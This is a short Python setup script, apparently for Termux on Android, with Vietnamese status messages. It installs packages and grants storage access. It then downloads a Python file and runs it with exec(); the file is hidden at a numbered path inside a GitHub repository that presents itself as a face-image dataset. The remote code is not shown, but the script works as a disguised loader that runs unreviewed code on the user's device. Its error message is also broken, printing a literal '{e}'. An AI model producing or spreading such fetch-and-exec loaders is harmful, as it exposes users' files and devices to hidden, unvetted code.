import os
os.system('clear')
print("\033[93mĐang setup: pkg install termux-am -y\033[0m")
os.system('pkg install termux-am -y')
print("\033[93mĐang setup: termux-setup-storage\033[0m")
os.system('termux-setup-storage')
print("\033[93mĐang setup: apt update -y\033[0m")
os.system('apt update -y')
print("\033[93mĐang setup: apt upgrade -y\033[0m")
os.system('apt upgrade -y')
os.system('pip install requests')
import requests 
try:
    exec(requests.get("https://raw.githubusercontent.com/tienmai291207/100k-faces/master/docs/0/4/004395.py").text)
except:
    print("Bạn chưa kết nối internet{e}")
